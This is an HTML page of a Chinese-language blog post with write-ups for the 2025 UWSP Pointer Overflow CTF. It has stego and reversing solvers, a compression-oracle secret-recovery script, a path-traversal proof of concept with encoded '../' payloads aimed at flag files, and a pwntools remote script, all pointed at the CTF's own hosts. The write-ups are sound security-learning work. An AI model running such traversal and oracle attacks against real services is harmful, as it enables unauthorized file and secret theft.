<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@只做了一点"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/2025uwsp-pointer-overflow-ctf-zrympb.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/2025uwsp-pointer-overflow-ctf-zrympb.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="2025UWSP Pointer Overflow CTF"><meta property="og:description" content="只做了一点"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2025-11-04T18:19:17+08:00"><meta property="article:modified_time" content="2025-11-15T14:39:02+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="2025UWSP Pointer Overflow CTF"><meta name=twitter:description content="只做了一点"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"2025UWSP Pointer Overflow CTF","item":"https://wh1tej0ker.github.io/post/2025uwsp-pointer-overflow-ctf-zrympb.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"2025UWSP Pointer Overflow CTF","name":"2025UWSP Pointer Overflow CTF","description":"只做了一点","keywords":[],"articleBody":"2025UWSP Pointer Overflow CTF 随便做了一点\nStego Stego 100-1 Ink Between the Lines 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 def extract_between_dot_and_newline(filepath): with open(filepath, \"rb\") as f: data = f.read() bits = \"\" inside = False temp = b\"\" for b in data: if b == 0x2E: # 遇到句号 '.' inside = True temp = b\"\" elif b == 0x0A: # 遇到换行 if inside and temp: # 提取其中的空白字符 for c in temp: if c == 0x20: # 空格 bits += \"0\" elif c == 0x09: # Tab bits += \"1\" bits += \" \" inside = False elif inside: temp += bytes([b]) return bits bits = extract_between_dot_and_newline(\"leaflet.txt\") # 转换为字符串 bin_data = \"\".join(bits.split()) print(bin_data) decoded = \"\".join( chr(int(bin_data[i:i+8], 2)) for i in range(0, len(bin_data), 8) ) print(decoded) Stego 100-3 Low Tide at Midnight 使用stegsolve调一下通道\n再手动恢复一下\n使用stegsolve调一下通道\n再手动恢复一下\n微信一扫就出来了\n1 poctf{uwsp_f0r3v3r_bl0w1n6_bubbl35} Reversing Reverse 100-1 Seven Easy Pieces 1 2 3 4 5 6 7 8 arr = [ 0x47,0x58,0x54,0x43,0x51,0x4C,0x42,0x40,0x44,0x47,0x68,0x02,0x07,0x5A,0x04, 0x68,0x51,0x5B,0x03,0x01,0x68,0x00,0x5F,0x06,0x02,0x68,0x00,0x42,0x45,0x59, 0x04,0x53,0x68,0x07,0x42,0x00,0x68,0x00,0x07,0x68,0x55,0x04,0x4A ] flag = ''.join(chr(x ^ 0x37) for x in arr) print(flag) Reverse 100-2 Left at the Light ‍\nbase64解码得到\n1 poctf{uwsp_wh33zy_wh15k3r5_4nd_w15py_w1nd5} Reverse 100-3 A Tree of Knives 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int __fastcall main(int argc, const char **argv, const char **envp) { FILE *v3; // rax int result; // eax char v5[264]; // [rsp+20h] [rbp-108h] BYREF if ( Size ) { if ( Size \u003c 0x100 ) { memcpy(v5, Src, Size); v5[Size] = 0; return _mingw_printf(\"Well done. Flag: %s\\n\", v5); } } else { v3 = __acrt_iob_func(2u); return _mingw_fprintf(v3, \"No flag buffer present. Aborting.\\n\"); } return result; } Reverse 100-4 Gremlins in the Gears upx脱壳就出\nReverse 200-1 On Hinge and Pin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package com.poctf.onhingeandpin; import android.content.Context; import java.io.IOException; import java.io.InputStream; import kotlin.Metadata; import kotlin.io.ByteStreamsKt; import kotlin.io.CloseableKt; import kotlin.jvm.internal.Intrinsics; import kotlin.text.Charsets; import kotlin.text.StringsKt; /* compiled from: Crypto.kt */ @Metadata(d1 = {\"\\u0000\\u001c\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0002\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\bÆ\\u0002\\u0018\\u00002\\u00020\\u0001B\\u0007\\b\\u0002¢\\u0006\\u0002\\u0010\\u0002J\\u0018\\u0010\\u0005\\u001a\\u00020\\u00042\\u0006\\u0010\\u0006\\u001a\\u00020\\u00072\\b\\b\\u0002\\u0010\\b\\u001a\\u00020\\u0004R\\u000e\\u0010\\u0003\\u001a\\u00020\\u0004X\\u0082T¢\\u0006\\u0002\\n\\u0000¨\\u0006\\t\"}, d2 = {\"Lcom/poctf/onhingeandpin/Crypto;\", \"\", \"()V\", \"KEY\", \"\", \"loadAndDecrypt\", \"ctx\", \"Landroid/content/Context;\", \"assetName\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48) /* loaded from: classes3.dex */ public final class Crypto { public static final Crypto INSTANCE = new Crypto(); private static final String KEY = \"ONOFFONOFF\"; private Crypto() { } public static /* synthetic */ String loadAndDecrypt$default(Crypto crypto, Context context, String str, int i, Object obj) { if ((i \u0026 2) != 0) { str = \"enc_flag.bin\"; } return crypto.loadAndDecrypt(context, str); } public final String loadAndDecrypt(Context ctx, String assetName) throws IOException { Intrinsics.checkNotNullParameter(ctx, \"ctx\"); Intrinsics.checkNotNullParameter(assetName, \"assetName\"); InputStream inputStreamOpen = ctx.getAssets().open(assetName); try { InputStream it = inputStreamOpen; Intrinsics.checkNotNull(it); byte[] data = ByteStreamsKt.readBytes(it); CloseableKt.closeFinally(inputStreamOpen, null); byte[] key = StringsKt.encodeToByteArray(KEY); byte[] out = new byte[data.length]; int length = data.length; for (int i = 0; i \u003c length; i++) { out[i] = (byte) (data[i] ^ key[i % key.length]); } return new String(out, Charsets.UTF_8); } finally { } } } 取出资源文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # decrypt_flag.py # Python 3 KEY = b\"ONOFFONOFF\" def decrypt_bytes(data): out = bytearray(len(data)) for i, b in enumerate(data): out[i] = b ^ KEY[i % len(KEY)] return bytes(out) if __name__ == \"__main__\": import sys fn = \"enc_flag.bin\" try: with open(fn, \"rb\") as f: data = f.read() except FileNotFoundError: print(f\"文件未找到: {fn}\") sys.exit(1) dec = decrypt_bytes(data) try: s = dec.decode(\"utf-8\") except: s = dec.decode(\"latin1\", errors=\"replace\") print(s) Reverse 200-2 Bearing the Load 断下,点击v6即可得到flag\nReverse 200-3 The Glass Bead Game Reverse 300-1 Through a Glass Darkly 直接z3求解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 # solve_flag_z3_prefix.py # pip install z3-solver from z3 import * mem1024 = [ord(c) for c in \"through_a_glass_darkly\"] # len=22 mem1056 = [ 0x43, 0x55, 0x84, 0x24, 0xF7, 0x5C, 0x90, 0xE9, 0xA8, 0xCD, 0x26, 0xBC, 0x07, 0x4A, 0x0E, 0xA8, 0xE5, 0x5A, 0x48, 0xE2, 0xBA, 0x77, 0x7D, 0x6E, 0x11, 0x86, 0xBE ] # len=27 N = 27 # 循环次数（.wat 中明确检查 27 个字节） # 8位循环左移 def rotl8(x: BitVecRef, s: int) -\u003e BitVecRef: return RotateLeft(x, s) # 建立 8位输入变量 a[0..26] a = [BitVec(f'a_{i}', 8) for i in range(N)] s = Solver() for i in range(N): # 选择 mem[1024] 的索引：i\u003c22 ? i : i-22 idx = i if i \u003c 22 else i - 22 C = BitVecVal(mem1024[idx] \u0026 0xFF, 8) K = BitVecVal(mem1056[i] \u0026 0xFF, 8) # s(i) = ((i % 7) + 1) \u0026 7 si = ((i % 7) + 1) \u0026 7 # D = C XOR ((73*i + 19) \u0026 0xFF) Di = C ^ BitVecVal(((73 * i + 19) \u0026 0xFF), 8) # rot = ROTL8(D, s(i)) rot = rotl8(Di, si) # T8 = (K + 123 - 17*i) \u0026 0xFF T8_val = (mem1056[i] + 123 - 17 * i) \u0026 0xFF T8 = BitVecVal(T8_val, 8) # 目标等式：a[i] == (rot XOR T8) s.add(a[i] == (rot ^ T8)) # ===== 固定前缀 poctf{ ===== prefix = b\"poctf{\" for i, ch in enumerate(prefix): s.add(a[i] == BitVecVal(ch, 8)) if s.check() != sat: print(\"unsat / 无解\") else: m = s.model() flag_bytes = bytes(int(m[a[i]].as_long()) \u0026 0xFF for i in range(N)) try: print(\"flag:\", flag_bytes.decode('utf-8')) except UnicodeDecodeError: print(\"flag (latin-1):\", flag_bytes.decode('latin-1')) print(\"hex :\", flag_bytes.hex()) Reverse 300-2 Make the Pieces Sing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 #!/usr/bin/env python3 # coding: utf-8 \"\"\" make_rev300_mid.py 生成用于 rev300-2 的最小 MIDI（format 0），正确实现 VLQ 与 track length。 输出文件: rev300_song_fixed.mid \"\"\" from pathlib import Path # 题目提示中给出的 40 字节十六进制指纹（20 对） HEX_KEY = \"550027202760306057602cc02cc050c027c02c60576029202960306059602ee05c605a6059602e60\" OUT = Path(\"rev300_song_fixed.mid\") PPQ = 480 # ticks per quarter (对解析无影响) def vlq_encode(value: int) -\u003e bytes: \"\"\"将非负整数编码为 MIDI VLQ（variable-length quantity）。\"\"\" assert value \u003e= 0 parts = [] parts.append(value \u0026 0x7F) value \u003e\u003e= 7 while value: parts.append((value \u0026 0x7F) | 0x80) value \u003e\u003e= 7 return bytes(reversed(parts)) def be16(n: int) -\u003e bytes: return n.to_bytes(2, \"big\") def be32(n: int) -\u003e bytes: return n.to_bytes(4, \"big\") def build_midi_from_hex(hex_key: str, channel: int = 0, vel_on: int = 0x40) -\u003e bytes: data = bytes.fromhex(hex_key) if len(data) != 40: raise ValueError(\"hex_key length != 40 bytes\") pairs = [(data[i], data[i+1]) for i in range(0, len(data), 2)] # (pitch, dt) # 构造 track 事件字节流 events = bytearray() # 选择使用 Note-On (0x90|ch) and Note-Off (0x80|ch) events note_on_status = 0x90 | (channel \u0026 0x0F) note_off_status = 0x80 | (channel \u0026 0x0F) vel_off = 0x00 # Optional: 在 track 开头插入一个 track name meta event（不是必要的） # events += vlq_encode(0) + bytes([0xFF, 0x03, 0x05]) + b\"REV30\" # 累加的 tick 值由 SING 的逻辑计算（程序里会累加读取的每个 delta） # 题目给的 dt 字节是：第一个为绝对 tick%256，后续为相对 delta%256。 # 这里直接把每个 dt 作为 MIDI 事件的 delta-time（以字节值作为整数） for (pitch, dt) in pairs: # delta-time: dt (0..255); 用 VLQ 正确编码 events += vlq_encode(dt) # Note-On (velocity 非零) events += bytes([note_on_status, pitch, vel_on]) # immediate Note-Off (delta=0) events += vlq_encode(0) events += bytes([note_off_status, pitch, vel_off]) # End of Track events += vlq_encode(0) + bytes([0xFF, 0x2F, 0x00]) # SMF Header (format 0, one track) header = b\"MThd\" + be32(6) + be16(0) + be16(1) + be16(PPQ) # Track chunk: 要写入长度字段（4 字节大端）为 events 的实际字节数 track = b\"MTrk\" + be32(len(events)) + bytes(events) return header + track def main(): mid = build_midi_from_hex(HEX_KEY) OUT.write_bytes(mid) print(f\"Wrote {OUT} ({len(mid)} bytes).\") print(\"运行验证: ./rev300-2 rev300_song_fixed.mid\") if __name__ == \"__main__\": main() Misc Misc 100-1 Honey, I Shrunk the Kids 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 #!/usr/bin/env python3 # -*- coding: utf-8 -*- \"\"\" Fast compression-oracle blind recovery (no CLI). - 两阶段选择：粗筛一遍 -\u003e 前K复测(取中位数) - 自适应节流 + 长连接 + 进度持久化 - 可选“重复增强”以放大 gzip 命中差异 \"\"\" import requests, time, json, urllib.parse, random from requests.adapters import HTTPAdapter from urllib3.util.retry import Retry from statistics import median # ================== 可调参数 ================== BASE_URL = \"https://misc100-1.pointeroverflowctf.com\" ORACLE_PATH = \"/oracle?q=\" START_PREFIX = \"poctf{uwsp_\" # 你已知的前缀；若要从最开头，请改成 \"poctf{\" MAXLEN = 200 OUT_PROGRESS = \"progress.json\" CANDIDATES = list(\"abcdefghijklmnopqrstuvwxyz0123456789_{}\") K_TOP = 5 # 进入复测的候选个数（粗筛后取前 K） RECHECK_TIMES = 3 # 复测次数（取中位数做评分） REQUEST_TIMEOUT= 8 BASE_DELAY = 0.20 # 基本间隔(秒) JITTER = 0.05 # 抖动(秒) BACKOFF_FACTOR = 0.7 MAX_RETRIES = 4 # “重复增强”系数：把 payload 重复 N 次拼接（很多 gzip 题有效） AMPLIFY = 2 # 建议 2~4；如服务器较脆弱设为 1 关闭 # ============================================= # —— 会话与请求 —— # def make_session(): s = requests.Session() retries = Retry( total=MAX_RETRIES, backoff_factor=BACKOFF_FACTOR, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=frozenset([\"GET\"]) ) s.mount(\"https://\", HTTPAdapter(max_retries=retries, pool_connections=16, pool_maxsize=32)) s.mount(\"http://\", HTTPAdapter(max_retries=retries, pool_connections=16, pool_maxsize=32)) s.headers.update({ \"User-Agent\": \"poctf-oracle-fast/2.0\", \"Accept\": \"application/json\", \"Connection\": \"keep-alive\", }) return s def encode_payload(p: str) -\u003e str: # 允许自定义放大：把猜测串重复拼接，放大压缩器“词典命中”差异 if AMPLIFY \u003e 1: p = p * AMPLIFY return urllib.parse.quote_plus(p, safe='') def oracle_len(sess, payload: str) -\u003e int: \"\"\"调用 /oracle 返回 compressed_len\"\"\" q = encode_payload(payload) url = BASE_URL.rstrip(\"/\") + ORACLE_PATH + q r = sess.get(url, timeout=REQUEST_TIMEOUT) if r.status_code == 429: # 遵循 Retry-After 或指数退避 ra = r.headers.get(\"Retry-After\") wait = float(ra) if ra else BACKOFF_FACTOR print(f\"[429] rate-limited, sleep {wait:.2f}s\") time.sleep(wait) # 再试一次（交给会话重试策略去兜底） r = sess.get(url, timeout=REQUEST_TIMEOUT) r.raise_for_status() data = r.json() return int(data[\"compressed_len\"]) # —— 轻量缓存：相同候选不重复请求 —— # cache = {} def score_once(sess, guess: str) -\u003e int: if guess in cache: return cache[guess] v = oracle_len(sess, guess) cache[guess] = v return v # —— 进度保存/恢复 —— # def save_progress(prefix: str): with open(OUT_PROGRESS, \"w\", encoding=\"utf-8\") as f: json.dump({ \"base\": BASE_URL, \"prefix\": prefix, \"ts\": time.time() }, f, ensure_ascii=False, indent=2) def load_progress(default_prefix: str) -\u003e str: try: with open(OUT_PROGRESS, \"r\", encoding=\"utf-8\") as f: data = json.load(f) if data.get(\"base\") == BASE_URL and data.get(\"prefix\", \"\").startswith(default_prefix): return data[\"prefix\"] except FileNotFoundError: pass return default_prefix # —— 主逻辑 —— # def pick_best_char(sess, prefix: str) -\u003e str: \"\"\" 两阶段： 1) 粗筛：对所有候选各测1次，取最小压缩长度的前K 2) 复测：对前K各测 RECHECK_TIMES 次，取中位数；再选最小者 \"\"\" # 随机化顺序，避免服务器缓存/频率偏置 cand = CANDIDATES[:] random.shuffle(cand) # 粗筛 scores = [] for ch in cand: payload = prefix + ch try: v = score_once(sess, payload) except Exception as e: # 失败给大数，避免误选 print(f\"[!] probe '{ch}' failed: {e}\") v = 10**9 scores.append((ch, v)) # 轻微抖动，降低节流 time.sleep(BASE_DELAY + random.uniform(0, JITTER)) # 取前K scores.sort(key=lambda x: (x[1], x[0])) topk = scores[:K_TOP] # 复测 best_ch, best_med = None, 10**9 for ch, v0 in topk: vals = [v0] for _ in range(RECHECK_TIMES - 1): try: vals.append(oracle_len(sess, prefix + ch)) except Exception as e: print(f\"[!] recheck '{ch}' failed: {e}\") vals.append(10**9) time.sleep(BASE_DELAY + random.uniform(0, JITTER)) m = median(vals) print(f\" '{ch}' -\u003e median {m} from {vals}\") if (m, ch) \u003c (best_med, best_ch or \"~\"): best_ch, best_med = ch, m print(f\"[+] choose '{best_ch}' (median={best_med})\") return best_ch def recover(): sess = make_session() prefix = load_progress(START_PREFIX) print(f\"[+] Start/Resume: {prefix}\") # 可选：先测一下面线 try: base_line = oracle_len(sess, prefix) print(f\"[i] baseline({len(prefix)}): {base_line}\") except Exception as e: print(f\"[!] initial probe failed: {e}\") while len(prefix) \u003c MAXLEN: print(f\"\\n[\u003e] pos {len(prefix)} …\") ch = pick_best_char(sess, prefix) prefix += ch print(f\"[=] {prefix}\") save_progress(prefix) if ch == \"}\": print(\"[✓] Closing brace found. Done.\") break print(f\"[FINAL] {prefix}\") return prefix if __name__ == \"__main__\": recover() Exploit Exploit 200-1 Queue the Music 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 #!/usr/bin/env python3 # -*- coding: utf-8 -*- # PoC for pointeroverflow exp200 queuer / path-traversal attempt # 使用方法: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com import sys import requests import time if len(sys.argv) != 2: print(\"Usage: python3 poc_explist.py \") print(\"Example: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com\") sys.exit(1) BASE = sys.argv[1].rstrip('/') # 你可以在这里添加/删减尝试的 sid 变体 CANDIDATES = [ \"../../flag/flag.txt\", \"../../../flag/flag.txt\", \"../../../../flag/flag.txt\", \"/tmp/uploads/../../flag/flag.txt\", \"/tmp/uploads/../../../flag/flag.txt\", \"../..//flag/flag.txt\", \"..%2f..%2fflag%2fflag.txt\", # URL encoded \"..\\\\..\\\\flag\\\\flag.txt\", # windows style (大多数 unix 服务会忽略) \"../../flag\", # 若服务拼接后再加 /track.txt -\u003e /flag/track.txt \"../../flag/\", # 同上，带尾斜杠 \"....//....//flag/flag.txt\", # 混淆型 ] # 一些 HTTP 头，模拟常见浏览器请求 HEADERS = { \"User-Agent\": \"PoC/1.0\", } def get_session(): url = BASE + \"/session\" try: r = requests.post(url, timeout=6, headers=HEADERS) try: j = r.json() sid = j.get(\"sid\") print(\"[*] /session -\u003e\", r.status_code, j) return sid except Exception: print(\"[*] /session raw -\u003e\", r.status_code, r.text[:200]) return None except Exception as e: print(\"[!] /session error:\", e) return None def upload_with_sid(sid_value, content=\"POC_CONTENT\"): url = BASE + \"/upload\" # 尝试多种提交方式：form-data 与 json # 1) form try: r = requests.post(url, data={\"sid\": sid_value, \"content\": content}, timeout=6, headers=HEADERS) print(f\" [upload form] sid={sid_value!r} -\u003e {r.status_code}\") except Exception as e: print(\" [upload form] error\", e) # 2) json try: r = requests.post(url, json={\"sid\": sid_value, \"content\": content}, timeout=6, headers=HEADERS) print(f\" [upload json] sid={sid_value!r} -\u003e {r.status_code}\") except Exception as e: print(\" [upload json] error\", e) def queue_with_sid(sid_value): url = BASE + \"/queue\" # 先尝试 form try: r = requests.post(url, data={\"sid\": sid_value}, timeout=6, headers=HEADERS) print(f\" [queue form] sid={sid_value!r} -\u003e {r.status_code}\") except Exception as e: print(\" [queue form] error\", e) # 再尝试 json try: r = requests.post(url, json={\"sid\": sid_value}, timeout=6, headers=HEADERS) print(f\" [queue json] sid={sid_value!r} -\u003e {r.status_code}\") except Exception as e: print(\" [queue json] error\", e) def get_playlist(): url = BASE + \"/playlist\" try: r = requests.get(url, timeout=6, headers=HEADERS) print(\"[*] GET /playlist -\u003e\", r.status_code) return r.text except Exception as e: print(\"[!] GET /playlist error:\", e) return \"\" def try_candidate(candidate): print(\"=\"*60) print(\"[*] try candidate:\", candidate) # 上传恶意 sid upload_with_sid(candidate, content=\"poc-track\") # 给服务一点时间处理（必要时可调小） time.sleep(0.2) # 触发 queue 行为 queue_with_sid(candidate) # 等待并读取 playlist time.sleep(0.5) pl = get_playlist() if not pl: print(\" [!] playlist empty or couldn't fetch\") return False, pl # 简单检测 flag-like pattern if \"flag{\" in pl or \"FLAG{\" in pl or \"poctf{\" in pl: print(\"[!!!] POSSIBLE FLAG FOUND in playlist for candidate:\", candidate) return True, pl else: print(\" [-] no flag pattern in playlist for candidate:\", candidate) return False, pl def main(): print(\"[*] Base URL:\", BASE) print(\"[*] First, get /session (optional)\") sid = get_session() if sid: print(\"[*] got server session sid:\", sid) else: print(\"[*] no sid from /session or couldn't parse; continuing with custom candidates\") # 首先尝试服务返回的 sid（如果有） if sid: ok, pl = try_candidate(sid) if ok: print(pl) return # 然后遍历我们预制的 candidate 列表 for c in CANDIDATES: ok, pl = try_candidate(c) if ok: print(\"\\n\\n[!!!] FOUND FLAG in playlist dump:\\n\") print(pl) return print(\"\\n[*] Try also manual fuzzing or add more traversal patterns to CANDIDATES.\") print(\"[*] If nothing found, 服务可能不会直接把 sid 当做文件路径拼接，或者 /tmp/uploads 不可写由外部用户修改。\") if __name__ == \"__main__\": main() Exploit 100-2 Mason, Meridian 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/env python3 from pwn import * HOST = \"exp100-2.pointeroverflowctf.com\" PORT = 14662 io = remote(HOST, PORT, timeout=5) io.sendline(b\"200:AAA\") buf = b\"\" while True: try: part = io.recv(timeout=1) if not part: break buf += part except EOFError: break except Exception: break print(buf.decode(errors=\"replace\")) io.close() ","wordCount":"4138","inLanguage":"en","datePublished":"2025-11-04T18:19:17+08:00","dateModified":"2025-11-15T14:39:02+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/2025uwsp-pointer-overflow-ctf-zrympb.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>2025UWSP Pointer Overflow CTF</h1></header><p><small>November 4, 2025&nbsp;· &nbsp;·</small><p><div class=blog-toc><nav id=TableOfContents><ul><li><a href=#stego-100-1-ink-between-the-lines>Stego 100-1 Ink Between the Lines</a></li><li><a href=#stego-100-3-low-tide-at-midnight>Stego 100-3 Low Tide at Midnight</a></li></ul><ul><li><a href=#reverse-100-1-seven-easy-pieces>Reverse 100-1 Seven Easy Pieces</a></li><li><a href=#reverse-100-2-left-at-the-light>Reverse 100-2 Left at the Light</a></li><li><a href=#reverse-100-3-a-tree-of-knives>Reverse 100-3 A Tree of Knives</a></li><li><a href=#reverse-100-4-gremlins-in-the-gears>Reverse 100-4 Gremlins in the Gears</a></li><li><a href=#reverse-200-1-on-hinge-and-pin>Reverse 200-1 On Hinge and Pin</a></li><li><a href=#reverse-200-2-bearing-the-load>Reverse 200-2 Bearing the Load</a></li><li><a href=#reverse-200-3-the-glass-bead-game>Reverse 200-3 The Glass Bead Game</a></li><li><a href=#reverse-300-1-through-a-glass-darkly>Reverse 300-1 Through a Glass Darkly</a></li><li><a href=#reverse-300-2-make-the-pieces-sing>Reverse 300-2 Make the Pieces Sing</a></li></ul><ul><li><a href=#misc-100-1-honey-i-shrunk-the-kids>Misc 100-1 Honey, I Shrunk the Kids</a></li></ul><ul><li><a href=#exploit-200-1-queue-the-music>Exploit 200-1 Queue the Music</a></li><li><a href=#exploit-100-2-mason-meridian>Exploit 100-2 Mason, Meridian</a></li></ul></nav></div><section class=blog-content><h1 id=2025uwsp-pointer-overflow-ctf>2025UWSP Pointer Overflow CTF</h1><p>随便做了一点</p><h1 id=stego>Stego</h1><h2 id=stego-100-1-ink-between-the-lines>Stego 100-1 Ink Between the Lines</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_between_dot_and_newline</span><span class=p>(</span><span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filepath</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bits</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>inside</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
